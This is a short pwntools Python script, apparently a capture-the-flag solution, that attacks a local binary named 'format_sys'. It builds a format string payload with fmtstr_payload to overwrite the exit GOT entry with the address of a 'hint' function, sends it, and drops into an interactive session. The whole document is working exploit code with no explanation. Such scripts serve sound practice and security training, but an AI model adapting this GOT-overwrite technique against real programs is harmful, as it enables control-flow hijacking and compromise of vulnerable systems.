from pwn import*
o = process("./format_sys")
elf = ELF("./format_sys")

exit_got = 0x804C018
hint = 0x80491A6
payload = b"a"*2 + fmtstr_payload(7, {exit_got: hint}, numbwritten=2, write_size='short')
print(payload)
pause()
o.sendline(payload)
o.interactive()